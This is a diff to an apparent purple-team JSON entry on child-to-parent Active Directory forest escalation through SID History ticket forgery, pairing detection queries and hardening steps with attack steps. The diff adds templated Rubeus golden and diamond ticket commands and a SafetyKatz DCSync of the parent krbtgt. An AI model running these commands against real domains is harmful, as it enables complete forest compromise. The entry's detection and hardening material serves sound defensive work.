@@ -100,10 +100,10 @@
     }
   ],
   "defense": {
-    "why_it_works": "In an AD forest, the Enterprise Admins and Schema Admins groups live in the forest root domain. When an attacker controls a child domain (via its krbtgt hash), they can forge a TGT with SID History containing the SID of the parent domain's Enterprise Admins group (S-1-5-21-<parent-SID>-519). The inter-realm TGT includes the extra SID — when the KDC in the parent domain processes the referral ticket, it honors the SID History (if SID filtering is not enforced between parent/child in the same forest, which is the default) and grants EA-level access.",
+    "why_it_works": "In an AD forest, the Enterprise Admins and Schema Admins groups live in the forest root domain. When an attacker controls a child domain (via its krbtgt hash), they can forge a TGT with SID History containing the SID of the parent domain's Enterprise Admins group (S-1-5-21-<parent-SID>-519). The inter-realm TGT includes the extra SID - when the KDC in the parent domain processes the referral ticket, it honors the SID History (if SID filtering is not enforced between parent/child in the same forest, which is the default) and grants EA-level access.",
     "prerequisites": "Compromised child domain krbtgt hash. Child domain SID and parent domain SID. Enterprise Admins SID (S-1-5-21-<parent-domain-SID>-519). Rubeus /golden with /sids parameter or Mimikatz kerberos::golden /sids. Network access between child and parent.",
-    "impact": "T1134.005 Access Token Manipulation: SID-History Injection + T1558.001 Golden Ticket. Escalates from child domain DA to forest root Enterprise Admin. Full forest compromise — all domains affected. Only 2 krbtgt rotations in the child domain + 2 in the forest root can remediate.",
-    "detection": "Event 4769 in the parent domain: TGS request with an inter-realm TGT containing extra SIDs from the child domain. MDI: 'Suspected cross-domain privilege escalation' / 'Inter-realm ticket with extra SIDs'. The inter-realm TGT contains SID History entries not present in the actual user's AD attributes — requires PAC inspection to detect.\nSuspicious token manipulation chains: token-related APIs (LogonUser, DuplicateTokenEx) or runas commands → new process spawned under different security context (e.g., SYSTEM) → mismatched parent-child process lineage or ETW token/PPID anomalies → abnormal lateral movement or privilege escalation activity (DET0283/AN0786).",
+    "impact": "T1134.005 Access Token Manipulation: SID-History Injection + T1558.001 Golden Ticket. Escalates from child domain DA to forest root Enterprise Admin. Full forest compromise - all domains affected. Only 2 krbtgt rotations in the child domain + 2 in the forest root can remediate.",
+    "detection": "Event 4769 in the parent domain: TGS request with an inter-realm TGT containing extra SIDs from the child domain. MDI: 'Suspected cross-domain privilege escalation' / 'Inter-realm ticket with extra SIDs'. The inter-realm TGT contains SID History entries not present in the actual user's AD attributes - requires PAC inspection to detect.\nSuspicious token manipulation chains: token-related APIs (LogonUser, DuplicateTokenEx) or runas commands → new process spawned under different security context (e.g., SYSTEM) → mismatched parent-child process lineage or ETW token/PPID anomalies → abnormal lateral movement or privilege escalation activity (DET0283/AN0786).",
     "artifacts": "MDI alert: inter-realm privilege escalation | Parent DC Event 4769: inter-realm TGT referral with extra SIDs | Child DC Event 4769: cross-domain referral ticket issued | SIEM: authentication from child domain user accessing forest root resources with EA-equivalent rights",
     "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4769\n| where like(Account_Domain, \"%child%\") AND Service_Name!=\"krbtgt\"\n| table _time, Account_Name, Account_Domain, Service_Name, Client_Address, Ticket_Encryption_Type\n\nindex=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4768\n| where Ticket_Encryption_Type=\"0x17\" AND Account_Domain!=\"<parent_domain>\"\n| table _time, Account_Name, Account_Domain, Client_Address",
     "elastic_kql": "event.code:\"4769\" AND winlog.event_data.TicketOptions:*0x40810000* AND source.domain:*child*\n\nevent.code:\"4768\" AND winlog.event_data.TicketEncryptionType:\"0x17\"",
@@ -115,7 +115,7 @@
       "https://attack.mitre.org/techniques/T1134/005/",
       "https://attack.mitre.org/techniques/T1558/001/"
     ],
-    "misconfiguration": "SID filtering not enforced between parent and child domains (default within a forest — by design). No MDI deployment. krbtgt passwords stale in child domains (attackers work down the trust chain systematically).",
+    "misconfiguration": "SID filtering not enforced between parent and child domains (default within a forest - by design). No MDI deployment. krbtgt passwords stale in child domains (attackers work down the trust chain systematically).",
     "vulnerable_config": "# SID filtering typically NOT applied within a forest (by design):\nGet-ADTrust -Filter {Target -eq 'CHILD.CORP.LOCAL'} | Select-Object SIDFilteringForestAware,SIDFilteringQuarantined\n# SIDFilteringForestAware: False, SIDFilteringQuarantined: False\n# → SID History in tickets crosses the trust = child DA → Forest EA\n\n# Required: child domain krbtgt hash (from child domain compromise):\n# Then: Rubeus /golden /user:DA /domain:child.corp.local /sid:<child-SID> /sids:<parent-EA-SID> /rc4:<krbtgt-hash>",
     "secure_config": "# Enable SID filtering on parent-child trust (breaks SID History but hardens forest):\nnetdom trust CHILD.CORP.LOCAL /domain:CORP.LOCAL /enablesidhistory:no /filtersids:yes\n\n# Or use Selective Authentication on forest trust:\nSet-ADTrust CHILD.CORP.LOCAL -SelectiveAuthentication $true\n\n# Deploy MDI on ALL DCs including child domain DCs:\n# MDI cross-domain correlation detects privilege escalation across trust boundaries\n\n# Treat child domain compromise as forest compromise:\n# Incident response: rotate krbtgt in BOTH child and parent domains\n# + change all DA passwords in both domains"
   },
@@ -131,6 +131,18 @@
     {
       "label": "Request a parent-domain TGS with the forged ticket",
       "command": "Rubeus.exe asktgs /ticket:<forged_tgt> /service:cifs/<parent_dc> /dc:<parent_dc> /ptt"
+    },
+    {
+      "label": "DC-identity OPSEC golden (extra SIDs -516, S-1-5-9)",
+      "command": "Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_sid>-516,S-1-5-9 /user:dcorp-dc$ /id:1000 /ptt"
+    },
+    {
+      "label": "Diamond ticket cross-trust (/sids)",
+      "command": "Rubeus.exe diamond /krbkey:<child_krbtgt_aes> /user:Administrator /domain:<child_domain> /sids:<parent_EA_sid> /enctype:aes /ptt"
+    },
+    {
+      "label": "DCSync parent forest root after escalation",
+      "command": "SafetyKatz.exe \"lsadump::dcsync /user:<parent_domain>\\krbtgt /domain:<parent_domain>\" \"exit\""
     }
   ]
 }
